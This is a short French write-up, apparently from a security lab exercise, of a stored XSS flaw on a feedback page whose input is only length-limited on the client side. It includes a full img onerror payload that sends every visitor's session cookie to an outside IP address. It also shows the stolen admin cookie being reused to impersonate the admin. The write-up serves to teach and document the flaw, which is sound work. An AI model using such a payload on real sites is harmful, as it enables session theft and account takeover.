Security breach name 	: XSS (Cross-site scripting) persistant

Principle 				: Insérer du code html/js/php dans un input pour essayer d'accéder à des données sensibles ou modifier la perception du site aux autres utilisateurs.

Solve 					: Stringifier les valeurs envoyé par le user.

In case 				: Sur la page feedback, un seul des deux inputs stringify la valeur entré par le user, le second ne fait que limiter la taille de son input,
							il nous a donc suffit de changer ca taille maximum pour ensuite y insérer du code nous permettant de d'envoyer le cookie de session de chaques users se rendant sur la page de feedback.
						Il faut utiliser un browser que Google Chrome car celui-ci bloque ce genre de contenu.

							code 	: <img src="azerty.jpg" onerror="window.location='http://46.101.40.236:3000/get_cookie_xss.php?cookie='+document.cookie;" hidden>
							result 	: http://46.101.40.236:3000/get_cookie_xss.php?cookie=I_am_admin=68934a3e9455fa72420237eb05902327


							Il nous restait plus qu'à changer le cookie I_am_admin pour se faire passer pour celui-ci.